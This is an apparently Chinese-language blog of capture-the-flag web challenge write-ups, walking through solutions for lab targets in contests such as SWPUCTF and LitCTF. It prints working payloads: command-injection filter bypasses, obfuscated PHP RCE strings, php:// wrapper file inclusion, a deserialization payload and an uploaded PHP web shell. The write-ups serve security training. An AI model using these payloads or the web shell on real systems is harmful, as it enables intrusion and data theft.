<p>发现有一个文件flllllaaaaaaggggggg，使用cat命令打开看看</p>
<p>即输入<code>/?url=system(&quot;cat /flllllaaaaaaggggggg&quot;)；</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202309061648745.png" alt="image-20230906164823704"></p>
<p>得到flag</p>

        <h2 id="二十、-SWPUCTF-2021-新生赛-easyupload3-0"   >
          <a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十、-SWPUCTF-2021-新生赛-easyupload3-0" class="headerlink" title="二十、[SWPUCTF 2021 新生赛]easyupload3.0"></a>二十、[SWPUCTF 2021 新生赛]easyupload3.0</h2>
      <p>同[GXYCTF2019]BabyUpload 1</p>
<p>依然是配置文件再上传一句话木马，最后flag在/var/www/html目录里</p>

        <h2 id="二十一、-SWPUCTF-2021-新生赛-babyrce"   >
          <a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十一、-SWPUCTF-2021-新生赛-babyrce" class="headerlink" title="二十一、[SWPUCTF 2021 新生赛]babyrce"></a>二十一、[SWPUCTF 2021 新生赛]babyrce</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111432130.png" alt="image-20240111143209010"></p>
<p>阅读代码可知，修改Cookie的值为 admin=1</p>
<p>使用HackBar修改</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111433470.png" alt="image-20240111143313395"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111433079.png" alt="image-20240111143329029"></p>
<p>提示有一个rasalghul.php，访问一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111434453.png" alt="image-20240111143404380"></p>
<p>阅读代码可知，通过GET方法传入参数url，但过滤了空格，同时使用 <code>shell_exec</code> 函数执行 <code>$ip</code> 变量中的命令</p>
<p>查看根目录下的文件和目录（别忘记绕过空格，此处用%09绕过）</p>
<p><code>?url=ls%09/;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111442737.png" alt="image-20240111144229660"></p>
<p>打开/flllllaaaaaaggggggg文件</p>
<p><code>?url=cat%09/flllllaaaaaaggggggg;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111443632.png" alt="image-20240111144342560"></p>
<p>获得flag</p>

        <h2 id="二十二、-LitCTF-2023-我Flag呢？"   >
          <a href="#二十二、-LitCTF-2023-我Flag呢？" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十二、-LitCTF-2023-我Flag呢？" class="headerlink" title="二十二、[LitCTF 2023]我Flag呢？"></a>二十二、[LitCTF 2023]我Flag呢？</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448541.png" alt="image-20240111144816063"></p>
<p>直接查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111448288.png" alt="image-20240111144844220"></p>
<p>得到flag</p>

        <h2 id="二十三、-LitCTF-2023-PHP是世界上最好的语言！！"   >
          <a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十三、-LitCTF-2023-PHP是世界上最好的语言！！" class="headerlink" title="二十三、[LitCTF 2023]PHP是世界上最好的语言！！"></a>二十三、[LitCTF 2023]PHP是世界上最好的语言！！</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111509396.png" alt="image-20240111150904300"></p>
<p>有一个RUN CODE按钮，试着输入一些命令运行</p>
<p>查看根目录下的文件，输入命令</p>
<p><code>system(&quot;ls /&quot;);</code></p>
<p>点击RUN CODE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111506640.png" alt="image-20240111150659574"></p>
<p>打开flag文件</p>
<p><code>system(&quot;cat /flag&quot;);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111508663.png" alt="image-20240111150824586"></p>
<p>获得flag</p>

        <h2 id="二十四、-ZJCTF-2019-NiZhuanSiWei"   >
          <a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十四、-ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="二十四、[ZJCTF 2019]NiZhuanSiWei"></a>二十四、[ZJCTF 2019]NiZhuanSiWei</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111625835.png" alt="image-20240111162515769"></p>
<p>阅读代码可知，用GET方法传入参数text，file和password</p>
<p>首先<code>$text</code> 所指向的文件内容要为字符串 “welcome to the zjctf”，变量 <code>$file</code> 中的字符串不能包含 “flag”，接着执行<code>$file</code> 变量指向的文件，后面有提示是useless.php，再反序列化 <code>$password</code> 变量的内容</p>
<p>利用data协议绕过file_get_contents，将welcome to the zjctf用base64编码格式输出为d2VsY29tZSB0byB0aGUgempjdGY=</p>
<p><code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111544052.png"></p>
<p>完成第一步，接下来执行<code>$file</code> 变量指向的文件，依然是利用伪协议</p>
<p><code>file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p>连起来payload为</p>
<p><code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=php://filter/read=convert.base64-encode/resource=useless.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111548387.png"></p>
<p>用CyberChef解码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111550040.png" alt="image-20240111155018918"></p>
<p>定义了一个Flag类，并在里面定义了属性<code>$file</code>，根据注释可以得知包含flag.php这个文件即可获得flag,即将Flag对象中的<code>$file</code>参数应为<code>flag.php</code></p>
<p>再根据<code>$password = unserialize($password);</code></p>

        <h6 id="若将一个序列化后的对象即一串字符串传给-password，那么我们会得到一个实例对象，若是我们将一个useless-php中的Flag对象-其中-file参数的值为flag-php-序列化后得到的字符串传给-password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码-且能输出flag-php中的代码"   >
          <a href="#若将一个序列化后的对象即一串字符串传给-password，那么我们会得到一个实例对象，若是我们将一个useless-php中的Flag对象-其中-file参数的值为flag-php-序列化后得到的字符串传给-password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码-且能输出flag-php中的代码" class="heading-link"><i class="fas fa-link"></i></a><a href="#若将一个序列化后的对象即一串字符串传给-password，那么我们会得到一个实例对象，若是我们将一个useless-php中的Flag对象-其中-file参数的值为flag-php-序列化后得到的字符串传给-password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码-且能输出flag-php中的代码" class="headerlink" title="若将一个序列化后的对象即一串字符串传给$password，那么我们会得到一个实例对象，若是我们将一个useless.php中的Flag对象(其中$file参数的值为flag.php)序列化后得到的字符串传给$password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码,且能输出flag.php中的代码"></a><em>若将一个序列化后的对象即一串字符串传给<code>$password</code>，那么我们会得到一个实例对象，若是我们将一个<code>useless.php</code>中的Flag对象(其中<code>$file</code>参数的值为<code>flag.php</code>)序列化后得到的字符串传给$password参数，经过反序列化后变变成了一个实例对象，一句可执行的代码,且能输出<code>flag.php</code>中的代码</em></h6>
      <p>构造：</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line"></span><br><span class="line">class Flag&#123;  //flag.php  </span><br><span class="line"></span><br><span class="line">  public $file = &quot;flag.php&quot;;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line">$password = new Flag();</span><br><span class="line"></span><br><span class="line">echo serialize($password);</span><br><span class="line"></span><br><span class="line">?&gt;  </span><br></pre></td></tr></table></div></figure>

<p>得到序列化</p>
<p><code>O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code>  </p>
<p>最终payload</p>
<p><code>/?text=data://text/plain;base64,d2VsY29tZSB0byB0aGUgempjdGY=&amp;file=useless.php&amp;password=O:4:&quot;Flag&quot;:1:&#123;s:4:&quot;file&quot;;s:8:&quot;flag.php&quot;;&#125;</code></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111623764.png" alt="image-20240111162302692"></p>
<p>得到flag</p>

        <h2 id="二十五、-BJDCTF-2020-easy-md5"   >
          <a href="#二十五、-BJDCTF-2020-easy-md5" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十五、-BJDCTF-2020-easy-md5" class="headerlink" title="二十五、[BJDCTF 2020]easy_md5"></a>二十五、[BJDCTF 2020]easy_md5</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111634746.png" alt="image-20240111163441663"></p>
<p>此题在BUU做过，但是这里没有告知源码</p>
<p>抓包一下，看到有个hint</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111635909.png" alt="image-20240111163530854"></p>
<p>意思是说md5($pass,true)的值恒为真，即md5加密后的变量pass恒为真，后面的true是把结果返回成16位原始二进制格式的字符串</p>
<p>要使md5($pass,true)的值恒为真，则结果应该是类似于’ ‘or’1‘的格式（or后面的字符不为0即可）</p>
<p>上网查了一下</p>
<p><span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/tzf1/p/14980531.html" >https://www.cnblogs.com/tzf1/p/14980531.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p>ffifdyop的md5值为</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401211315075.png" alt="image-20240121131515928"></p>
<p>满足恒为真的条件</p>
<p>但其实引号也不是很满足，后来查了源码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401211317033.png" alt="image-20240121131707957"></p>
<p>原来本身前面就有一个单引号闭合（其中的“.”是加上的意思）</p>
<p>输入ffifdyop</p>
<p>之后便按之前的方法，数组绕过</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401111640690.png" alt="image-20240111164012624"></p>
<p>得到flag</p>

        <h2 id="二十六、-LitCTF-2023-导弹迷踪"   >
          <a href="#二十六、-LitCTF-2023-导弹迷踪" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十六、-LitCTF-2023-导弹迷踪" class="headerlink" title="二十六、[LitCTF 2023]导弹迷踪"></a>二十六、[LitCTF 2023]导弹迷踪</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427123.png"></p>
<p>一个游戏界面，看看源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121427237.png" alt="image-20240112142742145"></p>
<p>后面一堆.js文件</p>
<p>这是一个游戏，所以在game.js文件里肯定能找到通关条件之类的</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121428674.png" alt="image-20240112142825600"></p>
<p>直接得到flag</p>

        <h2 id="二十七、-SWPUCTF-2021-新生赛-hardrce"   >
          <a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十七、-SWPUCTF-2021-新生赛-hardrce" class="headerlink" title="二十七、[SWPUCTF 2021 新生赛]hardrce"></a>二十七、[SWPUCTF 2021 新生赛]hardrce</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121431101.png" alt="image-20240112143102034"></p>
<p>是RCE题，但是过滤了很多字符，字母也过滤了</p>
<p>上网查了一下，可以使用取反绕过</p>

        <h6 id="url编码取反绕过-：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过"   >
          <a href="#url编码取反绕过-：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过" class="heading-link"><i class="fas fa-link"></i></a><a href="#url编码取反绕过-：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过" class="headerlink" title="url编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过"></a><em>url编码取反绕过 ：就是我们将php代码url编码后取反，我们传入参数后服务端进行url解码，这时由于取反后，会url解码成不可打印字符，这样我们就会绕过</em></h6>
      <p>对查询根目录下的文件语句取反，在shell里分别构造</p>
<p><code>php -r &quot;echo urlencode(~&#39;system&#39;);&quot;</code></p>
<p><code>php -r &quot;echo urlencode(~&#39;ls /&#39;);&quot;</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121451932.png" alt="image-20240112145159869"></p>
<p>于是构造payload（取反这部分要单独用括号括起来）</p>
<p><code>/?wllm=(~%8C%86%8C%8B%9A%92)(~%93%8C%DF%D0);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121453975.png" alt="image-20240112145303871"></p>
<p>有了/flllllaaaaaaggggggg文件</p>
<p>取反打开文件命令</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121454102.png" alt="image-20240112145425048"></p>
<p>构造最终payload</p>
<p><code>/?wllm=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%D0%99%93%93%93%93%93%9E%9E%9E%9E%9E%9E%98%98%98%98%98%98%98);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121454294.png" alt="image-20240112145452208"></p>
<p>得到flag</p>

        <h5 id="思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html"   >
          <a href="#思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html" class="heading-link"><i class="fas fa-link"></i></a><a href="#思路来源：https-www-cnblogs-com-EddieMurphy-blogs-p-17747410-html" class="headerlink" title="思路来源：https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html"></a>思路来源：<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html" >https://www.cnblogs.com/EddieMurphy-blogs/p/17747410.html</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></h5>
      
        <h2 id="二十八、-NSSCTF-2022-Spring-Recruit-ezgame"   >
          <a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十八、-NSSCTF-2022-Spring-Recruit-ezgame" class="headerlink" title="二十八、[NSSCTF 2022 Spring Recruit]ezgame"></a>二十八、[NSSCTF 2022 Spring Recruit]ezgame</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121720198.png" alt="image-20240112172024966"></p>
<p>查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121722265.png" alt="image-20240112172220181"></p>
<p>看一下.js文件</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121723492.png" alt="image-20240112172314425"></p>
<p>发现flag就在里面</p>

        <h2 id="二十九、-GXYCTF-2019-Ping-Ping-Ping"   >
          <a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#二十九、-GXYCTF-2019-Ping-Ping-Ping" class="headerlink" title="二十九、[GXYCTF 2019]Ping Ping Ping"></a>二十九、[GXYCTF 2019]Ping Ping Ping</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121741716.png" alt="image-20240112174121627"></p>
<p>先尝试输入ping命令</p>
<p><code>;ls</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121742764.png" alt="image-20240112174203700"></p>
<p>有flag.php文件，打开看看</p>
<p><code>;cat flag.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121743163.png" alt="image-20240112174320099"></p>
<p>空格被过滤了，绕过</p>
<p><code>;cat$IFS$1flag.php</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121744102.png" alt="image-20240112174412039"></p>
<p>flag也被过滤了</p>
<p>可以按[GXYCTF2019]Ping Ping Ping 1的方法</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401121744842.png" alt="image-20240112174455780"></p>
<p>最终得到flag</p>

        <h6 id="（PS-用内联执行还能看到过滤了哪些内容）"   >
          <a href="#（PS-用内联执行还能看到过滤了哪些内容）" class="heading-link"><i class="fas fa-link"></i></a><a href="#（PS-用内联执行还能看到过滤了哪些内容）" class="headerlink" title="（PS:用内联执行还能看到过滤了哪些内容）"></a>（PS:用内联执行还能看到过滤了哪些内容）</h6>
      
        <h2 id="三十、-LitCTF-2023-Follow-me-and-hack-me"   >
          <a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十、-LitCTF-2023-Follow-me-and-hack-me" class="headerlink" title="三十、[LitCTF 2023]Follow me and hack me"></a>三十、[LitCTF 2023]Follow me and hack me</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151428577.png" alt="image-20240115142835407"></p>
<p>按它的要求，用HackBar</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151432753.png" alt="image-20240115143217668"></p>
<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151432296.png" alt="image-20240115143234241"></p>
<p>得到flag</p>
<p>(瞅瞅备份文件</p>
<p>/<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="http://www.zip/" >www.zip</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151445090.png" alt="image-20240115144501973"></p>
<p>)</p>

        <h2 id="三十一、-LitCTF-2023-Ping"   >
          <a href="#三十一、-LitCTF-2023-Ping" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十一、-LitCTF-2023-Ping" class="headerlink" title="三十一、[LitCTF 2023]Ping"></a>三十一、[LitCTF 2023]Ping</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151519504.png" alt="image-20240115151942409"></p>
<p>在框内输入127.0.0.1</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151520062.png" alt="image-20240115152034970"></p>
<p>再试试一些命令，比如</p>
<p><code>;ls</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151521725.png" alt="image-20240115152108193"></p>
<p>看来不行，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151521798.png" alt="image-20240115152143728">定义了一个用于匹配 IP 地址的正则表达式。这个正则表达式包括四个部分，每个部分对应 IP 地址中的一个数字，这些部分由点号 (.) 分隔。每个部分可以匹配从 0 到 255 的数字</p>

        <h3 id="法Ⅰ：POST传参"   >
          <a href="#法Ⅰ：POST传参" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅰ：POST传参" class="headerlink" title="法Ⅰ：POST传参"></a>法Ⅰ：POST传参</h3>
      <p>然后发现下面有说用POST方法传入command参数，再尝试用HackBar传入一下命令（一般是flag文件，完整步骤应该是先用命令<code>;ls /</code>查看根目录下所有文件）</p>
<p><code>command=;cat /flag</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151524854.png" alt="image-20240115152402784"></p>
<p>EXECUTE</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151524475.png" alt="image-20240115152420415"></p>
<p>直接就有了</p>

        <h3 id="法Ⅱ：关闭JavaScript"   >
          <a href="#法Ⅱ：关闭JavaScript" class="heading-link"><i class="fas fa-link"></i></a><a href="#法Ⅱ：关闭JavaScript" class="headerlink" title="法Ⅱ：关闭JavaScript"></a>法Ⅱ：关闭JavaScript</h3>
      <p>是前端验证</p>
<p>在浏览器的设置里关掉网页的JavaScript，再在框内输入命令</p>
<p><code>;cat /flag</code></p>
<p>也能直接出</p>

        <h2 id="三十二、-SWPUCTF-2021-新生赛-finalrce"   >
          <a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十二、-SWPUCTF-2021-新生赛-finalrce" class="headerlink" title="三十二、[SWPUCTF 2021 新生赛]finalrce"></a>三十二、[SWPUCTF 2021 新生赛]finalrce</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151544848.png" alt="image-20240115154437783"></p>
<p>过滤了一堆命令和字符，再用取反试试(ls /)</p>
<p><code>/?url=(~%93%8C%DF%D0);</code></p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151627219.png" alt="image-20240115162758142"></p>
<p>抓包同样啥也没看见</p>

        <h6 id="用tee命令：Linux-tee命令用于读取标准输入的数据，并将其内容输出成文件。"   >
          <a href="#用tee命令：Linux-tee命令用于读取标准输入的数据，并将其内容输出成文件。" class="heading-link"><i class="fas fa-link"></i></a><a href="#用tee命令：Linux-tee命令用于读取标准输入的数据，并将其内容输出成文件。" class="headerlink" title="用tee命令：Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。"></a><em>用tee命令：Linux tee命令用于读取标准输入的数据，并将其内容输出成文件。</em></h6>
      
        <h6 id="基本结构为：command-tee-file-txt"   >
          <a href="#基本结构为：command-tee-file-txt" class="heading-link"><i class="fas fa-link"></i></a><a href="#基本结构为：command-tee-file-txt" class="headerlink" title="基本结构为：command | tee file.txt"></a><em>基本结构为：<code>command | tee file.txt</code></em></h6>
      
        <h6 id="因为题目没过滤-这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入"   >
          <a href="#因为题目没过滤-这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入" class="heading-link"><i class="fas fa-link"></i></a><a href="#因为题目没过滤-这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入" class="headerlink" title="因为题目没过滤 | , 这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入"></a><em>因为题目没过滤 | , 这是一个管道命令符号，用于将前一个命令的输出作为后一个命令的输入</em></h6>
      
        <h6 id="那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file-txt里"   >
          <a href="#那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file-txt里" class="heading-link"><i class="fas fa-link"></i></a><a href="#那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file-txt里" class="headerlink" title="那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file.txt里"></a><em>那么这句话的意思就是将command我们需要执行的命令的输出作为tee命令的输入，tee命令再将其存到file.txt里</em></h6>
      <p>但是用取反绕过ls访问文件无法访问，只能换一种方式绕过</p>

        <h6 id="转义字符-是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）"   >
          <a href="#转义字符-是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）" class="heading-link"><i class="fas fa-link"></i></a><a href="#转义字符-是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）" class="headerlink" title="转义字符 \ 是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）"></a><em>转义字符 \ 是用于在外壳程序中转移控制字符，使控制字符成为字面量，而失去其在外壳程序中控制符的含义（官方解释）</em></h6>
      <p>构造payload：</p>
<p><code>/?url=l\s / |tee 1.txt</code></p>
<p>访问/1.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151635643.png" alt="image-20240115163504578"></p>
<p>打开这个文件，但是cat被过滤了</p>

        <h6 id="tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式"   >
          <a href="#tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式" class="heading-link"><i class="fas fa-link"></i></a><a href="#tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式" class="headerlink" title="tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式"></a><em>tac：tac命令的功能是用于反向显示文件内容，即常见的查看文件内容命令cat的反写形式</em></h6>
      <p>构造最终payload（la也被过滤了）：</p>
<p><code>/?url=tac /flllll\aaaaaaggggggg |tee 2.txt</code></p>
<p>再访问/2.txt</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401151639166.png" alt="image-20240115163941098"></p>
<p>得到flag</p>

        <h2 id="三十三、-SWPUCTF-2022-新生赛-ez-ez-php"   >
          <a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十三、-SWPUCTF-2022-新生赛-ez-ez-php" class="headerlink" title="三十三、[SWPUCTF 2022 新生赛]ez_ez_php"></a>三十三、[SWPUCTF 2022 新生赛]ez_ez_php</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221211835.png" alt="image-20240122121130778"></p>
<p>阅读代码可知是要传入<code>file</code>参数，<code>if ( substr($_GET[&quot;file&quot;], 0, 3) === &quot;php&quot; ) &#123; ... &#125;</code>是检查 <code>file</code> 参数的前三个字符是否是 “php”。如果是，执行大括号内的代码，否则执行 <code>else</code> 语句，末尾又提醒我们flag可能在flag.php文件内</p>
<p>根据代码是要我们使用php伪协议并且是要用<code>php://filter</code>这种类型的</p>
<p>传入</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221222878.png" alt="image-20240122122235788"></p>
<p>到CyberChef解读一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221223417.png" alt="image-20240122122355335"></p>
<p>看来不对，但是又提示说真的flag在’flag’内，于是构造最终payload</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?file=php://filter/read=convert.base64-encode/resource=flag</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221208966.png" alt="image-20240122120816881"></p>
<p>到CyberChef解读一下</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221223698.png" alt="image-20240122122322631"></p>
<p>获得flag</p>

        <h2 id="三十四、-LitCTF-2023-作业管理系统"   >
          <a href="#三十四、-LitCTF-2023-作业管理系统" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十四、-LitCTF-2023-作业管理系统" class="headerlink" title="三十四、[LitCTF 2023]作业管理系统"></a>三十四、[LitCTF 2023]作业管理系统</h2>
      <p>打开之后是一个登陆界面，查看网页源代码</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221557477.png" alt="image-20240122155704390"></p>
<p>登录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221557311.png" alt="image-20240122155736099"></p>
<p>看到有上传文件，猜测是文件上传漏洞，上传写有一句话木马的文件test.php</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php @eval($_POST[cmd]);  ?&gt;</span><br></pre></td></tr></table></div></figure>

<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221558932.png" alt="image-20240122155838831"></p>
<p>上传成功，用蚁剑连接试试</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221600535.png" alt="image-20240122160003405"></p>
<p>查找文件的根目录</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221555294.png" alt="image-20240122155547178"></p>
<p>获得flag</p>

        <h2 id="三十五、-鹏城杯-2022-简单包含"   >
          <a href="#三十五、-鹏城杯-2022-简单包含" class="heading-link"><i class="fas fa-link"></i></a><a href="#三十五、-鹏城杯-2022-简单包含" class="headerlink" title="三十五、[鹏城杯 2022]简单包含"></a>三十五、[鹏城杯 2022]简单包含</h2>
      <p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221602742.png" alt="image-20240122160213679"></p>
<p>要使用POST方法传参flag，flag在/var/www/html/flag.php中</p>
<p>包含题可以尝试php伪协议，使用HackBar给flag传入参数</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag=php://filter/read=convert.base64-encode/resource=/var/www/html/flag.php</span><br></pre></td></tr></table></div></figure>

<p>EXECUTE后</p>
<p><img src="https://pig-007.oss-cn-beijing.aliyuncs.com/img/202401221609276.png" alt="image-20240122160936215"></p>
